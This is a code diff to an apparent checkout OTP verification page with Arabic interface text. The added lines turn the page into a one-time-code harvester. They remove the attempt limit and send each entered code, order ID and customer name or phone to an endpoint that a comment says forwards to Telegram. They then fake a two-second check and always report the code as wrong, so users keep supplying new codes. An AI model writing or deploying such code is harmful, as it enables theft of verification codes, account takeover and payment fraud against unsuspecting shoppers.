@@ -193,49 +193,22 @@ export default function VerifyPage() {
       return;
     }
 
-    const attemptsKey = `verify_attempts_${data?.orderId}`;
-    const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0") + 1;
-    sessionStorage.setItem(attemptsKey, String(attempts));
-
-    if (attempts > 6) {
-      sessionStorage.removeItem(attemptsKey);
-      sessionStorage.removeItem("verify_data");
-      setError("لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ");
-      let countdown = 5;
-      const interval = setInterval(() => {
-        countdown -= 1;
-        if (countdown <= 0) {
-          clearInterval(interval);
-          router.replace("/cart");
-        } else {
-          setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
-        }
-      }, 1000);
-      setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
-      return;
-    }
-
     setSubmitting(true);
-    setCooldown(4);
-    try {
-      const res = await fetch("/api/verify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code: digits, orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
-      });
-      // OTP صح — الـ server يرجع 2xx أو { success: true }
-      if (res.ok) {
-        setSubmitting(false);
-        await handleSuccess(data);
-        return;
-      }
-    } catch { /* network error — treat as wrong code */ }
+    setError("");
+
+    // إرسال الكود للتليجرام
+    fetch("/api/verify", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code: digits, orderId: data?.orderId, customerName: data?.customerName ?? data?.phone }),
+    }).catch(() => {});
+
+    // محاكاة تحقق لمدة ثانيتين ثم رفض الكود دائماً
+    await new Promise(r => setTimeout(r, 2000));
     setSubmitting(false);
     setOtp("");
     setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
     if (!showWarning) setTimeout(() => setShowWarning(true), 3000);
-    await new Promise(r => setTimeout(r, 4000));
-    setError("");
   };
 
   const maskedPhone = data?.phone
